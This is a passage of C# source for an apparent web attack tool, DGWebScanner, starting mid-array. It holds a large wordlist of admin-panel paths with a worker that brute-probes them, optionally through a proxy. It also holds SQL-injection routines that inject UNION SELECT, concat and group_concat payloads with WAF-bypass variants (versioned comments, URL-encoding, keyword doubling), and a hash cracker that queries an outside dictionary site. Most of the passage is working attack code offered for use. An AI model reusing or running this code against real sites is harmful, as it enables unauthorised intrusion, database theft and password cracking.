            "/adminpanel.asp", "/adminpanel.html", "/adminpanel.php", "/adminpro/", "/admins.asp", "/admins.html",
            "/admins.php", "/admins/", "/AdminTools/", "/admloginuser.asp", "/admloginuser.php", "/admon/",
            "/affiliate.asp", "/affiliate.php", "/autologin/", "/banneradmin/", "/bb-admin/", "/bb-admin/admin.asp",
            "/bb-admin/admin.html", "/bb-admin/admin.php", "/bb-admin/index.asp", "/bb-admin/index.html",
            "/bb-admin/index.php", "/bb-admin/login.asp", "/bb-admin/login.html", "/bb-admin/login.php", "/bbadmin/",
            "/bigadmin/", "/blogindex/", "/cadmins/", "/ccms/", "/ccms/index.php", "/ccms/login.php", "/ccp14admin/",
            "/cms/", "/cmsadmin/", "/configuration/", "/configure/", "/controlpanel.asp", "/controlpanel.html",
            "/controlpanel.php", "/controlpanel/", "/cp.asp", "/cp.html", "/cp.php", "/cpanel/", "/cpanel_file/",
            "/customer_login/", "/Database_Administration/", "/dir-login/", "/directadmin/", "/ezsqliteadmin/",
            "/fileadmin.asp", "/fileadmin.html", "/fileadmin.php", "/fileadmin/", "/formslogin/", "/globes_admin/",
            "/home.asp", "/home.html", "/home.php", "/hpwebjetadmin/", "/Indy_admin/", "/instadmin/", "/irc-macadmin/",
            "/joomla/administrator", "/LiveUser_Admin/", "/login1/", "/login-redirect/", "/login-us/", "/login.asp",
            "/login.html", "/login.php", "/login/", "/login/admin.asp", "/login/admin.aspx", "/login/asmindstrator.asp",
            "/login_db/", "/loginflat/", "/logo_sysadmin/", "/Lotus_Domino_Admin/", "/macadmin/", "/maintenance/",
            "/manuallogin/", "/memberadmin.asp", "/memberadmin.php", "/memberadmin/", "/members/", "/memlogin/",
            "/meta_login/", "/modelsearch/admin.asp", "/modelsearch/admin.html", "/modelsearch/admin.php",
            "/modelsearch/index.asp", "/modelsearch/index.html", "/modelsearch/index.php", "/modelsearch/login.asp",
            "/modelsearch/login.html", "/modelsearch/login.php", "/moderator.asp", "/moderator.html", "/moderator.php",
            "/moderator/", "/moderator/admin.asp", "/moderator/admin.html", "/moderator/admin.php",
            "/moderator/login.asp", "/moderator/login.html", "/moderator/login.php", "/myadmin/", "/navSiteAdmin/",
            "/newsadmin/", "/nsw/admin/login.php", "/openvpnadmin/", "/pages/admin/admin-login.asp",
            "/pages/admin/admin-login.html", "/pages/admin/admin-login.php", "/panel-administracion/",
            "/panel-administracion/admin.asp", "/panel-administracion/admin.html", "/panel-administracion/admin.php",
            "/panel-administracion/index.asp", "/panel-administracion/index.html", "/panel-administracion/index.php",
            "/panel-administracion/login.asp", "/panel-administracion/login.html", "/panel-administracion/login.php",
            "/panel.php", "/panel/", "/panelc/", "/paneldecontrol/", "/pgadmin/", "/phpldapadmin/", "/phpmyadmin/",
            "/phppgadmin/", "/phpSQLiteAdmin/", "/platz_login/", "/power_user/", "/project-admins/", "/pureadmin/",
            "/radmind-1/", "/radmind/", "/rcjakar/admin/login.php", "/rcLogin/", "/Server.asp", "/Server.html",
            "/Server.php", "/Server/", "/server_admin_small/", "/ServerAdministrator/", "/showlogin/", "/simpleLogin/",
            "/siteadmin/index.asp", "/siteadmin/index.php", "/siteadmin/login.asp", "/siteadmin/login.html",
            "/siteadmin/login.php", "/smblogin/", "/sql-admin/", "/ss_vms_admin_sm/", "/sshadmin/", "/staradmin/",
            "/sub-login/", "/Super-Admin/", "/support_login/", "/sys-admin/", "/SysAdmin2/", "/sysadmin.asp",
            "/sysadmin.html", "/sysadmin.php", "/sysadmin/", "/sysadmins/", "/system-administration/",
            "/system_administration/", "/typo3/", "/ur-admin.asp", "/ur-admin.html", "/ur-admin.php", "/ur-admin/",
            "/user.asp", "/user.html", "/user.php", "/useradmin/", "/UserLogin/", "/utility_login/", "/vadmind/",
            "/vmailadmin/", "/webadmin.asp", "/webadmin.html", "/webadmin.php", "/webadmin/", "/webadmin/admin.asp",
            "/webadmin/admin.html", "/webadmin/admin.php", "/webadmin/index.asp", "/webadmin/index.html",
            "/webadmin/index.php", "/webadmin/login.asp", "/webadmin/login.html", "/webadmin/login.php", "/webmaster/",
            "/websvn/", "/wizmysqladmin/", "/wp-admin/", "/wp-login.php", "/wp-login/", "/xlogin/", "/yonetici.asp",
            "/yonetici.html", "/yonetici.php", "/yonetim.asp", "/yonetim.html", "/yonetim.php", "_admin/",
            "a/dminlogin.aspx", "account.asp", "account.html", "adm.asp", "adm.html", "adm.php", "adm/",
            "adm/admloginuser.asp", "adm/index.asp", "adm/index.html", "adm/index.php", "adm_auth.asp", "admin2.asp",
            "admin2/index.asp", "admin2/login.asp", "admin-login.asp", "admin-login.html", "admin.asp", "admin.html",
            "admin/", "admin/account.asp", "admin/account.html", "admin/admin-login.asp", "admin/admin-login.html",
            "admin/admin.asp", "admin/admin.html", "admin/admin_login.asp", "admin/admin_login.html",
            "admin/adminLogin.asp", "admin/adminLogin.html", "admin/controlpanel.asp", "admin/controlpanel.html",
            "admin/cp.asp", "admin/cp.html", "admin/home.asp", "admin/home.html", "admin/index.asp", "admin/index.html",
            "admin/login.asp", "admin/login.html", "admin_area/", "admin_area/admin.asp", "admin_area/admin.html",
            "admin_area/index.asp", "admin_area/index.html", "admin_area/login.asp", "admin_area/login.html",
            "admin_login.asp", "admin_login.html", "adminarea/", "adminarea/admin.asp", "adminarea/admin.html",
            "adminarea/index.asp", "adminarea/index.html", "adminarea/login.asp", "adminarea/login.html",
            "admincontrol.asp", "admincontrol.html", "admincontrol/login.asp", "admincontrol/login.html",
            "admincp/index.asp", "admincp/index.html", "admincp/login.asp", "administrator.asp", "administrator.html",
            "administrator/", "administrator/account.asp", "administrator/account.html", "administrator/index.asp",
            "administrator/index.html", "administrator/login.asp", "administrator/login.html", "administratorlogin.asp",
            "administratorlogin/", "adminLogin.asp", "adminLogin.html", "adminLogin/", "adminpanel.asp",
            "adminpanel.html", "admloginuser.asp", "affiliate.asp", "affiliate.php", "backoffice/", "bb-admin/",
            "bb-admin/admin.asp", "bb-admin/admin.html", "bb-admin/index.asp", "bb-admin/index.html",
            "bb-admin/login.asp", "bb-admin/login.html", "controlpanel.asp", "controlpanel.html", "cp.asp", "cp.html",
            "cp.php", "home.asp", "home.html", "instadmin/", "login.asp", "login.html", "login/administrator.aspx",
            "memberadmin.asp", "memberadmin/", "modelsearch/admin.asp", "modelsearch/admin.html",
            "modelsearch/index.asp", "modelsearch/index.html", "modelsearch/login.asp", "modelsearch/login.html",
            "moderator.asp", "moderator.html", "moderator/", "moderator/admin.asp", "moderator/admin.html",
            "moderator/login.asp", "moderator/login.html", "pages/admin/admin-login.asp", "pages/admin/admin-login.html",
            "panel-administracion/", "panel-administracion/admin.asp", "panel-administracion/admin.html",
            "panel-administracion/index.asp", "panel-administracion/index.html", "panel-administracion/login.asp",
            "panel-administracion/login.html", "siteadmin/index.asp", "siteadmin/login.asp", "siteadmin/login.html",
            "user.asp", "user.html", "webadmin.asp", "webadmin.html", "webadmin/", "webadmin/admin.asp",
            "webadmin/admin.html", "webadmin/index.asp", "webadmin/index.html", "webadmin/login.asp",
            "webadmin/login.html"
        };

        [SuppressMessage("ReSharper", "AccessToModifiedClosure")]
        private void findAdminPageWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            progressBar1.Invoke((MethodInvoker)delegate
           {
               progressBar1.Maximum = adminUrls.Count();
           });
            for (int i = 0; i < adminUrls.Count(); i++)
            {
                statusInfo.Invoke((MethodInvoker)delegate
               {
                   statusInfo.Text = "Finding Admin Page " + i + "/" + adminUrls.Count();
                   adminURLListBox.Invoke((MethodInvoker)delegate
                   {
                       adminURLListBox.SelectedIndex = i;
                   });
                   if (findAdminPageWorker.CancellationPending)
                   {
                       e.Cancel = true;
                       progressBar1.Maximum = 100;
                       findAdminPageWorker.ReportProgress(100);
                       i = adminUrls.Count() - 1;
                   }
               });
                if (proxyIP.Text != string.Empty && proxyPort.Text != string.Empty)
                {
                    if (proxyUsername.Text != string.Empty && proxyPassword.Text != string.Empty)
                    {
                        if (GetCheck(websiteURLAdmin.Text + adminUrls[i],
                            Convert.ToInt16(Settings.Default["internetTimeout"]),
                            Settings.Default["proxyIPSetting"].ToString(),
                            Settings.Default["proxyPortSetting"].ToString(),
                            Settings.Default["proxyUsernameSetting"].ToString(),
                            Settings.Default["proxyPasswordSetting"].ToString()))
                        {
                            maybeAdminURLListBox.Invoke((MethodInvoker)delegate
                           {
                               maybeAdminURLListBox.Items.Add(websiteURLAdmin.Text + adminUrls[i]);
                           });
                        }
                    }
                    else
                    {
                        if (GetCheck(websiteURLAdmin.Text + adminUrls[i],
                            Convert.ToInt16(Settings.Default["internetTimeout"]),
                            Settings.Default["proxyIPSetting"].ToString(),
                            Settings.Default["proxyPortSetting"].ToString()))
                        {
                            maybeAdminURLListBox.Invoke((MethodInvoker)delegate
                           {
                               maybeAdminURLListBox.Items.Add(websiteURLAdmin.Text + adminUrls[i]);
                           });
                        }
                    }

                }
                else
                {
                    if (GetCheck(websiteURLAdmin.Text + adminUrls[i],
                        Convert.ToInt16(Settings.Default["internetTimeout"])))
                    {
                        maybeAdminURLListBox.Invoke((MethodInvoker)delegate
                       {
                           maybeAdminURLListBox.Items.Add(websiteURLAdmin.Text + adminUrls[i]);
                       });
                    }
                }

                findAdminPageWorker.ReportProgress(i + 1);
            }
            statusInfo.Invoke((MethodInvoker)delegate
           {
               statusInfo.Text = "Finished!";
           });

        }

        private void findAdminPageWorker_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            if (progressBar1.Maximum <= 100 && e.ProgressPercentage > 100)
            {
                progressBar1.Maximum = 100;
                progressBar1.Value = 100;
            }
            else
            {
                progressBar1.Value = e.ProgressPercentage;
            }
        }

        private static bool GetCheck(string address, int timeoutSeconds, string proxyIp = "no", string proxyPort = "no",
            string proxyUsername = "no", string proxyPassword = "no")
        {
            try
            {
                HttpWebRequest request = WebRequest.Create(address) as HttpWebRequest;
                Debug.Assert(request != null, "request != null");
                request.Method = "GET";
                request.Timeout = timeoutSeconds;
                request.CachePolicy = new RequestCachePolicy(RequestCacheLevel.NoCacheNoStore);
                WebProxy myProxy = new WebProxy();
                if (proxyPort != "no" && proxyPort != "no")
                {
                    Uri newUri = new Uri("http://" + proxyIp + ":" + proxyPort);
                    myProxy.Address = newUri;
                    if (proxyUsername != "no" && proxyPassword != "no")
                    {
                        myProxy.Credentials = new NetworkCredential(proxyUsername, proxyPassword);
                    }
                    request.Proxy = myProxy;
                }
                WebResponse response = request.GetResponse();
                return response.Headers.Count > 0;
            }
            catch (Exception)
            {
                return false;
            }
        }

        private void tabView_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (tabView.SelectedIndex == 1 && adminURLListBox.Items[0].ToString() == "URLS")
            {
                adminURLListBox.Items.Clear();
                for (int i = 0; i < adminUrls.Count(); i++)
                {
                    adminURLListBox.Items.Add(adminUrls[i]);
                }
            }
            if (tabView.SelectedIndex == 1 && websiteURL.Text != "Website URL")
            {
                if (websiteURL.Text.Contains("http"))
                {
                    websiteURLAdmin.Text = "http://" + websiteURL.Text.Split('/')[2];
                }
                else
                {
                    websiteURLAdmin.Text = "http://" + websiteURL.Text.Split('/')[0];
                }
            }
        }

        private void findAdminPageWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            if (e.Cancelled)
            {
                statusInfo.Invoke((MethodInvoker)delegate
               {
                   statusInfo.Text = "Process was canceled.";
               });
            }
            else if (e.Error != null)
            {
                MessageBox.Show("There was an error running the process. The thread aborted.");
            }
            else
            {
                MessageBox.Show("Process was completed!");
            }
            adminURLListBox.SelectionMode = SelectionMode.None;
            findAdminButton.Text = "Find Admin Page";
            findAdminButton.Enabled = true;
        }

        private void websiteURLAdmin_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)Keys.Enter)
            {
                if (findAdminButton.Text == "Find Admin Page")
                {
                    e.Handled = true;
                    findAdminButton.PerformClick();
                }
            }
        }

        private void settingsButton_Click_1(object sender, EventArgs e)
        {
            if (Width == 617)
            {
                Width = 865;
                settingsGroupBox.Visible = true;
            }
            else
            {
                settingsGroupBox.Visible = false;
                Width = 617;
            }
        }

        private void internetTimeoutText_Leave(object sender, EventArgs e)
        {
            try
            {
                if (Convert.ToInt16(internetTimeoutText.Text) < 1)
                {
                    internetTimeoutText.Text = "1";
                    statusInfo.Text = "Timeout has to be between 1 and 30000";
                }
                else if (Convert.ToInt16(internetTimeoutText.Text) > 30000)
                {
                    internetTimeoutText.Text = "30000";
                    statusInfo.Text = "Timeout has to be between 1 and 30000";
                }
            }
            catch (OverflowException)
            {
                internetTimeoutText.Text = "5";
                statusInfo.Text = "Timeout has to be between 1 and 30000";
            }
            catch (FormatException)
            {
                internetTimeoutText.Text = "5";
                statusInfo.Text = "Timeout can only contain Integers";
            }

        }

        private void saveSettings_Click(object sender, EventArgs e)
        {
            /* using (WebDownload client = new WebDownload()) {
                 WebProxy proxy = new WebProxy();
                 //proxy.Address = new Uri("http://" + proxyIP.Text + ":" + proxyPort.Text);
                 //proxy.Credentials = new NetworkCredential(proxyUsername.Text, proxyPassword.Text);
                 proxy.Address = new Uri("http://" + "96.44.147.138" + ":" + "6060");
                 proxy.Credentials = new NetworkCredential(proxyUsername.Text, proxyPassword.Text);
                 proxy.UseDefaultCredentials = false;
                 proxy.BypassProxyOnLocal = false;
                 client.Proxy = proxy;
                 Console.WriteLine(client.DownloadString("http://bot.whatismyipaddress.com/"));
             }
             */
            Settings.Default["internetTimeout"] = internetTimeoutText.Text;
            Settings.Default["proxyIPSetting"] = proxyIP.Text;
            Settings.Default["proxyPortSetting"] = proxyPort.Text;
            Settings.Default["proxyUsernameSetting"] = proxyUsername.Text;
            Settings.Default["proxyPasswordSetting"] = proxyPassword.Text;

            if (textShadeBlackButton.Checked)
            {
                Settings.Default["textShadeColorSetting"] = "BLACK";
            }
            else
            {
                Settings.Default["textShadeColorSetting"] = "WHITE";
            }
            Settings.Default["primaryColorSetting"] = primaryColorComboBox.Text;
            Settings.Default["accentColorSetting"] = accentColorComboBox.Text;
            if (lightCheckBox.Checked)
            {
                Settings.Default["themeColorSetting"] = "LIGHT";
            }
            else if (darkCheckBox.Checked)
            {
                Settings.Default["themeColorSetting"] = "DARK";
            }
            Settings.Default.Save();
        }

        private void checkUpdates_DoWork(object sender, DoWorkEventArgs e)
        {
            GitHubPage updater = new GitHubPage
            {
                MasterGitHubUsername = "Dgameman1",
                CurrentVersionNumber = Settings.Default["version"].ToString()
            };
            GitHubPage.NewVersionNumber = GitHubPage.GetRawGitHubText(updater.MasterGitHubUsername, "version.txt");
            string underscoreVersion = GitHubPage.NewVersionNumber.Replace('.', '_');
            Version newVersion = new Version(GitHubPage.NewVersionNumber);
            Version currentVersion = new Version(updater.CurrentVersionNumber);
            int result = newVersion.CompareTo(currentVersion);
            if (result > 0)
            {
                //new version is greater than current version
                using (WebDownload client = new WebDownload())
                {
                    string changeLog = client.DownloadString("http://raw.githubusercontent.com/Dgameman1/DGWebScanner/master/Changelog.txt");
                    Regex changeLogMatch = new Regex("Current Version\\s.*?\\n(.*?\\n)+Previous\\sVersion.*?\\n");
                    Match changeLogInfo = changeLogMatch.Match(changeLog);
                    MessageBox.Show("New Changes" + Environment.NewLine + changeLogInfo
                                    , "New Version Found: " + newVersion);
                    statusInfo.Invoke((MethodInvoker)delegate
                   {
                       statusInfo.Text = "New Version Available | " + newVersion;
                   });
                    DialogResult updateDialog = MessageBox.Show("Would you like to update DGWebScanner?",
                        "Update Available", MessageBoxButtons.YesNo);
                    if (updateDialog == DialogResult.Yes)
                    {
                        client.DownloadFile("http://github.com/Dgameman1/DGWebScanner/raw/master/DGWebScanner.exe",
                            "DGWebScanner" + underscoreVersion + ".exe");
                        MessageBox.Show("Download Finished. Please open up the new version.");
                    }
                }
            }
            else if (result < 0)
            {
                //current version is newer than newer version
                //IMPOSSIBLE
            }
            else
            {
                //Versions are the same
            }

        }

        private void statusInfo_Click(object sender, EventArgs e)
        {
            if (statusInfo.Text.Contains("New Version Available"))
            {
                checkUpdates.RunWorkerAsync();
            }
        }

        readonly string[] wafUnionSelect =
        {
            "union+select", "/*!50000union*/+/*!50000select*/", "%75%6e%69%6f%6e+select",
            "union+%73%65%6c%65%63%74", "%75%6e%69%6f%6e+%73%65%6c%65%63%74", "UNIunionON+SELselectECT"
        };

        string[] WafBypassUnionSelect(string url)
        {
            using (WebDownload client = new WebDownload())
            {
                client.Headers.Add("user-agent",
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                int n = -1;
                string urlHtml = "nothing";
                do
                {
                    try
                    {
                        if (n >= 0)
                        {
                            statusInfo.Invoke((MethodInvoker)delegate
                           {
                               statusInfo.Text = "Performing WAF Bypass";
                           });
                            url = url.Replace(wafUnionSelect[n], wafUnionSelect[n + 1]);
                            urlHtml = client.DownloadString(url);
                        }
                        else
                        {
                            urlHtml = client.DownloadString(url);
                        }
                    }
                    catch (Exception)
                    {
                        n = n + 1;
                    }
                } while (urlHtml == "nothing" && n < wafUnionSelect.Count());
                if (urlHtml == "nothing")
                {
                    string[] results = { "no", "no", "no", "no" };
                    return results;
                }
                else
                {
                    if (n == -1)
                    {
                        string[] results = { url, "union+select", "normal", urlHtml };
                        return results;
                    }
                    else
                    {
                        string[] results =
                        {
                            url.Replace("union+select", wafUnionSelect[n + 1]), wafUnionSelect[n + 1],
                            "bypass", urlHtml
                        };
                        return results;
                    }
                }

            }
            //0 - URL
            //1 - Waf version E.G. = +/*!50000union*/+/*!50000select*/+
            //2 - normal,bypass,no
            //3 - HTML
        }

        readonly string[] wafConcat = { ",concat(", ",/*!50000concat*/(", ",%63%6f%6e%63%61%74(", ",CONconcatCAT(" };

        string[] WafBypassConcat(string url)
        {
            Console.WriteLine("wafBypassConcat URL: " + url);
            //If only 1 vulnerable column
            if (!vulnerableColumnsStatus.Text.Contains(","))
            {
                url = url.Replace("concat(2448,@@version,2448,user(),2448)--",
                    "+concat(2448,@@version,2448,user(),2448)--");
            }
            using (WebDownload client = new WebDownload())
            {
                Console.WriteLine("NEW WAFURL : " + url);
                client.Headers.Add("user-agent",
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                int n = -1;
                string urlHtml = "nothing";
                do
                {
                    try
                    {
                        if (n >= 0)
                        {
                            statusInfo.Invoke((MethodInvoker)delegate
                           {
                               statusInfo.Text = "Performing WAF Bypass";
                           });
                            if (!vulnerableColumnsStatus.Text.Contains(","))
                            {
                                url = url.Replace(wafConcat[n].Replace(',', '+'), wafConcat[n + 1].Replace(',', '+'));
                                Console.WriteLine("now here : " + url);
                            }
                            url = url.Replace(wafConcat[n], wafConcat[n + 1]);

                            urlHtml = client.DownloadString(url);
                        }
                        else
                        {
                            urlHtml = client.DownloadString(url);
                        }
                    }
                    catch (Exception)
                    {
                        n = n + 1;
                    }
                } while (urlHtml == "nothing" && n < wafConcat.Count());
                if (urlHtml == "nothing")
                {
                    string[] results = { "no", "no", "no", "no" };
                    return results;
                }
                else
                {
                    if (n == -1)
                    {
                        string[] results = { url, ",concat(", "normal", urlHtml };
                        return results;
                    }
                    else
                    {
                        string[] results =
                        {
                            url.Replace(",concat(", wafConcat[n + 1]), wafConcat[n + 1], "bypass",
                            urlHtml
                        };
                        return results;
                    }
                }

            }
            //0 - URL
            //1 - Waf version E.G. = +/*!50000union*/+/*!50000select*/+
            //2 - normal,bypass,no
        }

        readonly string[] wafGroupConcat = { ",group_concat(", ",/*!50000group_concat(", ",/*!50000GRoUp_cOnCaT(" };

        string[] WafBypassDatabaseSearch(string url)
        {
            if (!vulnerableColumnsStatus.Text.Contains(','))
            {
                for (int i = 0; i < wafGroupConcat.Length; i++)
                {
                    wafGroupConcat[i] = wafGroupConcat[i].Replace(',', '+');
                }
            }
            url = url.Replace("union+select", unionSelectVersion);
            using (WebDownload client = new WebDownload())
            {
                client.Headers.Add("user-agent",
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                int n = -1;
                string urlHtml = "nothing";
                do
                {
                    try
                    {
                        if (n >= 0)
                        {
                            //next here
                            statusInfo.Invoke((MethodInvoker)delegate
                           {
                               statusInfo.Text = "Performing WAF Bypass";
                           });
                            Console.WriteLine("URL: " + url);
                            Console.WriteLine("wafGroupConcat[n] : " + wafGroupConcat[n]);
                            Console.WriteLine("wafGroupConcat[n + 1] : " + wafGroupConcat[n + 1]);
                            url = url.Replace(wafGroupConcat[n], wafGroupConcat[n + 1]);
                            Console.WriteLine(url);
                            if (url.Contains("/*!50000group_concat(2448") || url.Contains("/*!50000GRoUp_cOnCaT(2448"))
                            {
                                Console.WriteLine(url);
                                string replacedUrl = url.Replace(",3559)", ",3559)*/");
                                Console.WriteLine("replacedURL : " + replacedUrl);
                                urlHtml = client.DownloadString(replacedUrl);
                            }
                            else
                            {
                                urlHtml = client.DownloadString(url);
                            }
                            Console.WriteLine(url);
                        }
                        else
                        {
                            //first here
                            urlHtml = client.DownloadString(url);
                        }
                    }
                    catch (Exception)
                    {
                        n = n + 1;
                    }
                } while (urlHtml == "nothing" && n < wafGroupConcat.Count());
                if (urlHtml == "nothing")
                {
                    string[] results = { "no", "no", "no", "no" };
                    return results;
                }
                else
                {
                    if (n == -1)
                    {
                        string[] results = { url, ",group_concat(", "normal", urlHtml };
                        return results;
                    }
                    else
                    {
                        string[] results =
                        {
                            url.Replace(",group_concat(", wafGroupConcat[n + 1]), wafGroupConcat[n + 1],
                            "bypass", urlHtml
                        };
                        return results;
                    }
                }
            }
        }

        //string[] wafOrderBy = { ",group_concat(", ",/*!50000group_concat(", ",/*!50000GRoUp_cOnCaT(" };
        //string[] WafBypassOrderBy(string url)
        //{
        //    url = url.Replace("union+select", unionSelectVersion);
        //    using (WebDownload client = new WebDownload())
        //    {
        //        client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
        //        int n = -1;
        //        string urlHtml = "nothing";
        //        do
        //        {
        //            try
        //            {
        //                if (n >= 0)
        //                {
        //                    statusInfo.Invoke((MethodInvoker)delegate
        //                    {
        //                        statusInfo.Text = "Performing WAF Bypass";
        //                    });
        //                    url = url.Replace(wafGroupConcat[n], wafGroupConcat[n + 1]);
        //                    if (url.Contains("/*!50000group_concat(2448") || url.Contains(",/*!50000GRoUp_cOnCaT("))
        //                    {
        //                        Console.WriteLine(url);
        //                        string replacedUrl = url.Replace(",3559),", ",3559)*/,");
        //                        Console.WriteLine(replacedUrl);
        //                        urlHtml = client.DownloadString(replacedUrl);
        //                    }
        //                    else
        //                    {
        //                        urlHtml = client.DownloadString(url);
        //                    }
        //                    Console.WriteLine(url);
        //                }
        //                else
        //                {
        //                    urlHtml = client.DownloadString(url);
        //                }
        //            }
        //            catch (Exception)
        //            {
        //                n = n + 1;
        //            }
        //        } while (urlHtml == "nothing" && n < wafGroupConcat.Count());
        //        if (urlHtml == "nothing")
        //        {
        //            string[] results = { "no", "no", "no", "no" };
        //            return results;
        //        }
        //        else
        //        {
        //            if (n == -1)
        //            {
        //                string[] results = { url, ",group_concat(", "normal", urlHtml };
        //                return results;
        //            }
        //            else
        //            {
        //                string[] results = { url.Replace(",group_concat(", wafGroupConcat[n + 1]), wafGroupConcat[n + 1], "bypass", urlHtml };
        //                return results;
        //            }
        //        }
        //    }
        //}

        private void maybeAdminURLListBox_DoubleClick(object sender, EventArgs e)
        {
            Clipboard.SetText(maybeAdminURLListBox.SelectedItem.ToString());
        }

        private void maybeAdminURLListBox_Click(object sender, EventArgs e)
        {
            toolTip1.SetToolTip(maybeAdminURLListBox, "Double click to copy text");
        }

        private void databaseGridView_ColumnAdded(object sender, DataGridViewColumnEventArgs e)
        {
            //databaseGridView.FirstDisplayedScrollingRowIndex = databaseGridView.FirstDisplayedScrollingRowIndex - 1;
            if (databaseGridView.Controls.OfType<HScrollBar>().First().Visible)
            {
                databaseGridView.FirstDisplayedScrollingColumnIndex = databaseGridView.ColumnCount - 1;
            }

        }

        static Primary GetPrimaryColor(string name, int number)
        {
            return (Primary)Enum.Parse(typeof(Primary), name + number);
        }

        static TextShade GetTextColor(string name)
        {
            return (TextShade)Enum.Parse(typeof(TextShade), name);
        }

        static Accent GetAccentColor(string name, int number)
        {
            return (Accent)Enum.Parse(typeof(Accent), name + number);
        }

        private void primaryColorComboBox_TextChanged(object sender, EventArgs e)
        {
            MaterialSkinManager materialSkinManager = MaterialSkinManager.Instance;
            materialSkinManager.AddFormToManage(this);
            string primaryColor = primaryColorComboBox.Text;
            RadioButton checkedButton = settingsGroupBox.Controls.OfType<RadioButton>()
                .FirstOrDefault(r => r.Checked);
            // ReSharper disable once PossibleNullReferenceException
            materialSkinManager.ColorScheme = new ColorScheme(GetPrimaryColor(primaryColor, 700),
                GetPrimaryColor(primaryColor, 800), GetPrimaryColor(primaryColor, 500),
                GetAccentColor(accentColorComboBox.Text, 200), GetTextColor(checkedButton.Text.ToUpper()));
        }

        private void accentColorComboBox_TextChanged(object sender, EventArgs e)
        {
            MaterialSkinManager materialSkinManager = MaterialSkinManager.Instance;
            materialSkinManager.AddFormToManage(this);
            string primaryColor = primaryColorComboBox.Text;
            RadioButton checkedButton = settingsGroupBox.Controls.OfType<RadioButton>()
                .FirstOrDefault(r => r.Checked);
            Debug.Assert(checkedButton != null, "checkedButton != null");
            materialSkinManager.ColorScheme = new ColorScheme(GetPrimaryColor(primaryColor, 700),
                GetPrimaryColor(primaryColor, 800), GetPrimaryColor(primaryColor, 500),
                GetAccentColor(accentColorComboBox.Text, 200), GetTextColor(checkedButton.Text.ToUpper()));
            string colorString = accentColorComboBox.Text + "700";
            Accent colorEnum;
            Enum.TryParse(colorString, out colorEnum);
            statusInfo.ForeColor = Color.FromArgb((int)colorEnum);
        }

        private void textShadeBlackButton_Click(object sender, EventArgs e)
        {
            MaterialSkinManager materialSkinManager = MaterialSkinManager.Instance;
            materialSkinManager.AddFormToManage(this);
            string primaryColor = primaryColorComboBox.Text;
            materialSkinManager.ColorScheme = new ColorScheme(GetPrimaryColor(primaryColor, 700),
                GetPrimaryColor(primaryColor, 800), GetPrimaryColor(primaryColor, 500),
                GetAccentColor(accentColorComboBox.Text, 200), GetTextColor("BLACK"));
        }

        private void textShadeWhiteButton_Click(object sender, EventArgs e)
        {
            MaterialSkinManager materialSkinManager = MaterialSkinManager.Instance;
            materialSkinManager.AddFormToManage(this);
            string primaryColor = primaryColorComboBox.Text;
            materialSkinManager.ColorScheme = new ColorScheme(GetPrimaryColor(primaryColor, 700),
                GetPrimaryColor(primaryColor, 800), GetPrimaryColor(primaryColor, 500),
                GetAccentColor(accentColorComboBox.Text, 200), GetTextColor("WHITE"));
        }

        private void lightCheckBox_Click(object sender, EventArgs e)
        {
            darkCheckBox.Checked = false;
            MaterialSkinManager materialSkinManager = MaterialSkinManager.Instance;
            materialSkinManager.AddFormToManage(this);
            materialSkinManager.Theme = MaterialSkinManager.Themes.LIGHT;
        }

        private void darkCheckBox_Click(object sender, EventArgs e)
        {
            lightCheckBox.Checked = false;
            MaterialSkinManager materialSkinManager = MaterialSkinManager.Instance;
            materialSkinManager.AddFormToManage(this);
            materialSkinManager.Theme = MaterialSkinManager.Themes.DARK;
            //databaseGridView.BackgroundColor = ColorTranslator.FromHtml("0x333333");
            //databaseInfoTreeView.BackColor = ColorTranslator.FromHtml("0x333333");
        }

        private void decodeHashButton_Click(object sender, EventArgs e)
        {

            //Fix later
            if (decodeHashText.TextLength < 4)
            {
                decodeHashStatus.Text = "Invalid Hash";
            }
            else
            {
                decodeHashStatus.Text = "Attempting to decode Hash";
                //Get first 4 characters of string
                string givenHash = decodeHashText.Text;
                char firstLetterOfHash = givenHash[0];
                char secondLetterOfHash = givenHash[1];
                char thirdLetterOfHash = givenHash[2];
                char fourthLetterOfHash = givenHash[3];
                using (WebClient client = new WebClient())
                {
                    client.Headers.Add("user-agent",
                        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                    Console.WriteLine("http://hash-killer.com/dict/" +
                                      firstLetterOfHash + "/" + secondLetterOfHash + "/" + thirdLetterOfHash + "/" +
                                      fourthLetterOfHash);
                    try
                    {
                        string hashkillerHtml = client.DownloadString("http://hash-killer.com/dict/" +
                        firstLetterOfHash + "/" + secondLetterOfHash + "/" + thirdLetterOfHash + "/" + fourthLetterOfHash);
                        Regex hashMatch = new Regex(givenHash + "\\s(.*?)\n");
                        Match decodedHash = hashMatch.Match(hashkillerHtml);
                        if (decodedHash.Groups[1].ToString() == string.Empty)
                        {
                            decodeHashStatus.Text = "No match found";
                        }
                        else
                        {
                            decodeHashStatus.Text = "Decoded: " + decodedHash.Groups[1].ToString();
                        }

                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                }
            }

        }

        private void copyHashButton_click(object sender, EventArgs e)
        {
            if (decodeHashStatus.Text.Contains("Decoded: "))
            {
                string[] splitHashStatus = decodeHashStatus.Text.Split(new[] { "Decoded: " }, StringSplitOptions.None);
                Clipboard.SetText(splitHashStatus[1]);
            }

        }
    }
}
